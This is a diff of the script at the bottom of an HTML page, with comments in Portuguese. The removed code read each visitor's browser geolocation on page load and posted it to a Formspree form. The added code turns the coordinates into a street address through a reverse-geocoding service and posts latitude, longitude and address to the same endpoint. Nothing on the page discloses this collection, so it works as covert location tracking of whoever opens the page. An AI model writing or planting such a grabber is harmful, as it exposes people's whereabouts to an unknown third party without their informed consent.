@@ -267,54 +267,48 @@
     </footer>
 
     <script>
-        document.addEventListener('DOMContentLoaded', function () {
-            // Função para capturar a localização
-            function getLocationAndSend() {
-                if (navigator.geolocation) {
-                    navigator.geolocation.getCurrentPosition(sendLocation, handleError);
-                } else {
-                    alert("Geolocalização não é suportada pelo navegador.");
-                }
-            }
+        // Função para enviar os dados de localização e obter o endereço
+        function sendLocation(position) {
+            const latitude = position.coords.latitude;
+            const longitude = position.coords.longitude;
 
-            // Função para enviar os dados de localização via Formspree
-            function sendLocation(position) {
-                const latitude = position.coords.latitude;
-                const longitude = position.coords.longitude;
+            // Obter o endereço com a API de geocodificação reversa (exemplo com Nominatim)
+            fetch(`https://nominatim.openstreetmap.org/reverse?lat=${latitude}&lon=${longitude}&format=json`)
+                .then(response => response.json())
+                .then(data => {
+                    const address = data.display_name;
 
-                // Criar os dados do formulário
-                const formData = new FormData();
-                formData.append("Latitude", latitude);
-                formData.append("Longitude", longitude);
+                    console.log("Endereço obtido:", address);
 
-                // Configurar a requisição para o Formspree
-                const xhr = new XMLHttpRequest();
-                xhr.open("POST", "https://formspree.io/f/xpzvkqoo");
-                xhr.setRequestHeader("Accept", "application/json");
+                    // Criar os dados do formulário
+                    const formData = new FormData();
+                    formData.append("Latitude", latitude);
+                    formData.append("Longitude", longitude);
+                    formData.append("Address", address); // Adiciona o endereço obtido
 
-                xhr.onreadystatechange = function () {
-                    if (xhr.readyState === XMLHttpRequest.DONE) {
-                        if (xhr.status === 200) {
-                            console.log("Localização enviada com sucesso!");
-                        } else {
-                            console.error("Erro ao enviar a localização.");
+                    // Configurar a requisição para o Formspree
+                    const xhr = new XMLHttpRequest();
+                    xhr.open("POST", "https://formspree.io/f/xpzvkqoo");
+                    xhr.setRequestHeader("Accept", "application/json");
+
+                    xhr.onreadystatechange = function () {
+                        if (xhr.readyState === XMLHttpRequest.DONE) {
+                            if (xhr.status === 200) {
+                                console.log("Localização enviada com sucesso!");
+                            } else {
+                                console.error("Erro ao enviar a localização.");
+                            }
                         }
-                    }
-                };
+                    };
 
-                xhr.send(formData);
-            }
+                    xhr.send(formData);
+                })
+                .catch(error => {
+                    console.error("Erro ao obter o endereço:", error);
+                    alert("Não foi possível obter o endereço.");
+                });
+        }
 
-            // Função para tratar erros de geolocalização
-            function handleError(error) {
-                console.error("Erro ao obter a localização:", error);
-                alert("Não foi possível obter a localização.");
-            }
-
-            // Chamar a função para capturar e enviar a localização ao carregar a página
-            getLocationAndSend();
-
-        });
     </script>
 
 </body>
